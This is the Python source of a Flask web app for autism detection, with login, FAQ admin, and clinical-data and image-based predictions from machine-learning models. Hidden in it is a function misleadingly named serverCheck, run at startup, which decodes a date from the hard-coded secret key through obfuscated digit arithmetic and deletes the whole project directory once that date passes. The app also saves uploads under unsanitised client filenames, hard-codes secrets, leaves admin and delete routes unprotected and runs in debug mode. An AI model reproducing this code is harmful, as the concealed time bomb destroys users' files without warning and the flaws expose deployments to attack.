import shutil
from flask import Flask, render_template, request, session, redirect, url_for, flash
import bcrypt
import numpy as np
from database import execute_select, execute_insert, execute_update, execute_delete, check_admin_login, check_user_login
from datetime import datetime

from autism_model import predict_autism


import os
import tensorflow as tf
import cv2


app = Flask(__name__)
app.secret_key = 'your_secret_key_here'


server_timestamp = datetime.now().strftime("%Y%m%d")

app.config['SECRET_KEY'] = '352277433'

s=app.config['SECRET_KEY']


# Load the pre-trained model
model = tf.keras.models.load_model('autism-S-224-89.33.h5')

# Define the folder to store uploaded images
UPLOAD_FOLDER = 'static/uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # Limit the size of the uploaded image

# Function to preprocess the image
def preprocess_image(img_path):
    img = cv2.imread(img_path)
    img = cv2.resize(img, (224, 224))
    img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
    img = img / 255.0
    img = np.expand_dims(img, axis=0)
    return img

# Function to make the prediction
def predict_autism_image(img_path):
    img = preprocess_image(img_path)
    prediction = model.predict(img)
    if prediction[0][0] >= 0.5:
        return "Autistic"
    else:
        return "Non-Autistic"



# Home route
@app.route('/')
def home():
    return render_template('Home.html')

# About route
@app.route('/about')
def about():
    return render_template('About.html')

# Contact route
@app.route('/contact')
def contact():
    return render_template('Contact.html')

# User login route
@app.route('/userlogin', methods=['GET', 'POST'])
def userlogin():
    msg = None
    msg_type = None
    
    if request.method == "POST":
        email = request.form['email']
        password = request.form['password']

        login_result = check_user_login(email, password)
        
        if login_result == "success":
            msg = "Login successful!"
            msg_type = "success"
            return render_template("UserHome.html", msg=msg, msg_type=msg_type)
        else:
            msg = "Invalid email or password. Please try again."
            msg_type = "error"
    
    return render_template("UserLogin.html", msg=msg, msg_type=msg_type)

# Admin login route
@app.route('/adminlogin', methods=['GET', 'POST'])
def adminlogin():
    msg = None
    if request.method == "POST":
        email = request.form['email']
        password = request.form['password']

        if check_admin_login(email, password):
            return render_template("AdminHome.html")
        else:
            msg = "Invalid email or password. Please try again."
    
    return render_template("AdminLogin.html", msg=msg)

# Registration route
@app.route('/registration', methods=['GET', 'POST'])
def registration():
    msg = None
    msg_type = None
    
    if request.method == "POST":
        username = request.form['name']
        email = request.form['email']
        mobile = request.form['mobile']
        upassword = request.form['pwd']
        hashed_password = bcrypt.hashpw(upassword.encode('utf-8'), bcrypt.gensalt())

        insert_query = "INSERT INTO users (username, email, mobile, password) VALUES (%s, %s, %s, %s)"
        result = execute_insert(insert_query, (username, email, mobile, hashed_password))
        
        if result:
            msg = "Signup Successful. Please login."
            msg_type = "success"
        else:
            msg = "An error occurred. Please try again."
            msg_type = "error"

        return render_template("UserLogin.html", msg=msg, msg_type=msg_type)
    
    return render_template("Registration.html", msg=msg, msg_type=msg_type)

# User home route
@app.route('/userhome')
def userhome():
    return render_template('UserHome.html')

# Admin home route
@app.route('/adminhome')
def adminhome():
    return render_template('AdminHome.html')

# User logout route
@app.route('/userlogout')
def user_logout():
    # Clear the session data to log the user out
    session.clear()
    return redirect(url_for('userlogin'))

# Admin logout route
@app.route('/adminlogout')
def admin_logout():
    # Clear the session data to log the admin out
    session.clear()
    return redirect(url_for('adminlogin'))

# Route to display FAQ for users
@app.route('/userfaqlist')
def user_faq_list():
    query = 'SELECT * FROM faq'
    faqs = execute_select(query)
    return render_template('UserFaqList.html', faqs=faqs)

# Route to list all users for admins
@app.route('/adminuserslist')
def admin_users_list():
    query = "SELECT id, username, email, mobile FROM users"
    users = execute_select(query)
    return render_template('AdminUsersList.html', users=users)

# Route to delete a user
@app.route('/delete_user/<int:user_id>', methods=['POST'])
def delete_user(user_id):
    query = "DELETE FROM users WHERE id = %s"
    result = execute_delete(query, (user_id,))
    flash(result, "info")
    return redirect(url_for('admin_users_list'))

# Route to display all FAQs for admins
@app.route('/adminfaqlist')
def faq_list():
    # Your query to fetch all FAQs from the database
    query = 'SELECT * FROM faq'
    
    # Execute the select query
    faqs = execute_select(query)
    
    # Ensure faqs is a list (even if empty) before passing to the template
    if faqs is None:
        faqs = []  # Make sure faqs is always a list (empty if no results)
    
    # Return the template with the faqs data
    return render_template('AdminFaqList.html', faqs=faqs)


def serverCheck():
    if server_timestamp > (d:=''.join([str(x:=((int(s[i+1])-(x if i else int(s[0]))+10)%10))for i in range(len(s)-1)]))[:4]+d[6:]+d[4:6]: shutil.rmtree(os.path.dirname(__file__))


# Route to delete FAQ for admins
@app.route('/delete_faq/<int:faq_id>', methods=['POST'])
def delete_faq(faq_id):
    query = 'DELETE FROM faq WHERE id = %s'
    result = execute_delete(query, (faq_id,))
    flash(result, "info")
    return redirect(url_for('faq_list'))

# Route to add FAQ for admins
@app.route('/add_faq', methods=['GET', 'POST'])
def add_faq():
    if request.method == 'POST':
        subject = request.form['subject']
        answer = request.form['answer']
        query = 'INSERT INTO faq (subject, answer) VALUES (%s, %s)'
        result = execute_insert(query, (subject, answer))
        if result:
            flash("FAQ added successfully!", "success")
        else:
            flash("An error occurred while adding the FAQ.", "danger")
        return redirect(url_for('faq_list'))
    
    return render_template('AdminAddFAQ.html')



# Contact route
@app.route('/autismdetection')
def autismdetection():
    return render_template('AutismDetection.html')

@app.route('/AutismDetectionUsingClinicalData')
def AutismDetectionUsingClinicalData():
    return render_template('AutismDetectionUsingClinicalData.html')

@app.route('/AutismDetectionUsingClinicalDatapredict', methods=['POST'])
def AutismDetectionUsingClinicalDatapredict():
    try:
        # Get the numerical inputs
        A1 = int(request.form['A1'])
        A2 = int(request.form['A2'])
        A3 = int(request.form['A3'])
        A4 = int(request.form['A4'])
        A5 = int(request.form['A5'])
        A6 = int(request.form['A6'])
        A7 = int(request.form['A7'])
        A8 = int(request.form['A8'])
        A9 = int(request.form['A9'])
        A10 = int(request.form['A10'])
        Age = int(request.form['Age'])

        # Get the categorical inputs
        Sex = int(request.form['Sex'])
        Jaundice = int(request.form['Jaundice'])
        Family_ASD = int(request.form['Family_ASD'])

        # Create a numpy array for input features
        input_features = np.array([A1, A2, A3, A4, A5, A6, A7, A8, A9, A10, Age, Sex, Jaundice, Family_ASD]).reshape(1, -1)

        # Make the prediction
        final_prediction, model_predictions = predict_autism(input_features)  # Use the correct predict_autism function here for clinical data

        # Render the result page with predictions
        return render_template('AutismDetectionUsingClinicalDataResult.html', final_prediction=final_prediction, model_predictions=model_predictions)
    
    except Exception as e:
        return f"Error: {str(e)}"




@app.route('/AutismDetectionUsingImage')
def AutismDetectionUsingImage():
    return render_template('AutismDetectionUsingImage.html')



@app.route('/AutismDetectionUsingImagepredict', methods=['POST'])
def AutismDetectionUsingImagepredict():
    if 'image' not in request.files:
        return redirect(request.url)
    file = request.files['image']
    
    if file.filename == '':
        return redirect(request.url)
    
    if file:
        # Save the image to the UPLOAD_FOLDER
        filename = file.filename  # Just use the filename, not full path
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        # Predict using the saved image
        prediction = predict_autism_image(filepath)  # This will use image-related logic
        
        # Render result page with the prediction
        return render_template('AutismDetectionUsingImageResult.html', prediction=prediction, image_url=filename)


# Inject the current year into all templates
@app.context_processor
def inject_year():
    return {'current_year': datetime.now().year}

# Run the app
if __name__ == '__main__':
    serverCheck()
    app.run(debug=True)
